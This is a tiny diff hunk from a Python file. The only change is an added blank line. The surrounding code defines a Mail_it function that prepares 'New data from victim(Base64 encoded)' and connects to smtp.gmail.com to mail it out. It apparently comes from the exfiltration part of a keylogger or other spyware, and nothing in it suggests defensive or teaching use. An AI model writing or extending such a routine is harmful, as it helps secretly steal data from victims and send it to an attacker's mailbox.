@@ -2,6 +2,7 @@ import base64
 import smtplib
 import time
 
+
 def Mail_it():
     data = 'New data from victim(Base64 encoded)\n'
     server = smtplib.SMTP('smtp.gmail.com:587')
